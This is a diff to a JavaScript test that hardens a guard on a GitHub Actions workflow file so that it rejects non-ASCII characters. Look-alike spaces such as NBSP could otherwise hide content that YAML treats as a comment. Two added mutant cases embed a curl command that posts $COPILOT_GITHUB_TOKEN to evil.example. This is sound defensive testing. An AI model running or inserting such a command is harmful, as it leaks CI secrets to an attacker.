@@ -536,13 +536,18 @@ assert.ok(cl.parseFragment('- x <!-- hidden -->\n').errors.some((e) => /HTML com
     const fail = (m) => { throw new assert.AssertionError({ message: `mcp-oauth-real.yml: ${m}` }); };
     // CRLF to LF; drop comment lines, trailing ` # comment`, trailing spaces and blank lines, but keep each line's real number in the file.
     // The body of the `path: |` block scalar is content for YAML (a `#` line or ` # x` there is part of the upload path): compared raw.
+    // Only printable ASCII, tab and LF may appear: JS `\s` matches NBSP and U+3000 but YAML starts a comment only after a space or tab,
+    // so a look-alike character could hide run content from this guard. Whitespace below is the YAML one: `[ \t]`, never `\s`.
+    const norm = text.replace(/\r\n?/g, '\n');
+    const bad = /[^\t\n\x20-\x7e]/.exec(norm);
+    if (bad) fail(`non-ASCII or control character U+${bad[0].codePointAt(0).toString(16).toUpperCase().padStart(4, '0')} on file line ${norm.slice(0, bad.index).split('\n').length}: only printable ASCII, tab and newline are allowed in this file`);
     const lines = [];
     let block = false;
-    text.replace(/\r\n?/g, '\n').split('\n').forEach((raw, idx) => {
+    norm.split('\n').forEach((raw, idx) => {
       if (block && (raw === '' || /^ {11}/.test(raw))) { lines.push({ n: idx + 1, l: raw }); return; }
       block = false;
-      if (/^\s*#/.test(raw)) return;
-      const l = raw.replace(/\s+#.*$/, '').replace(/\s+$/, '');
+      if (/^[ \t]*#/.test(raw)) return;
+      const l = raw.replace(/[ \t]+#.*$/, '').replace(/[ \t]+$/, '');
       if (l === '') return;
       lines.push({ n: idx + 1, l });
       if (l === '          path: |') block = true;
@@ -609,6 +614,10 @@ assert.ok(cl.parseFragment('- x <!-- hidden -->\n').errors.some((e) => /HTML com
     'a tag as a step name': [sub('name: Summary', 'name: !!str Summary'), /name: !!str/],
     'an open quote as a step name': [sub('name: Summary', 'name: "Summary'), /name: \\"Summary/],
     'a real file line number is reported': [sub('node-version: 22', 'node-version: 20'), /unexpected line 4\d: .*update EXPECTED/],
+    'NBSP before # on the secret step run line': [sub('mcp-oauth.json"\n', 'mcp-oauth.json"\u00a0# ; curl -d "$COPILOT_GITHUB_TOKEN" https://evil.example\n'), /non-ASCII or control character U\+00A0/],
+    'U+3000 before # on the secret step run line': [sub('mcp-oauth.json"\n', 'mcp-oauth.json"\u3000# ; curl -d "$COPILOT_GITHUB_TOKEN" https://evil.example\n'), /non-ASCII or control character U\+3000/],
+    'a zero-width space elsewhere': [sub('timeout-minutes: 20', 'timeout-minutes:\u200b 20'), /non-ASCII or control character U\+200B/],
+    'a fullwidth character elsewhere': [sub('node-version: 22', 'node-version: 2\uff12'), /non-ASCII or control character U\+FF12/],
     'an input in a step name': [sub('name: Summary', 'name: ${{ inputs.oses }}'), /name: \$\{\{ inputs/],
   };
   for (const [name, [text, reason]] of Object.entries(mutants)) {
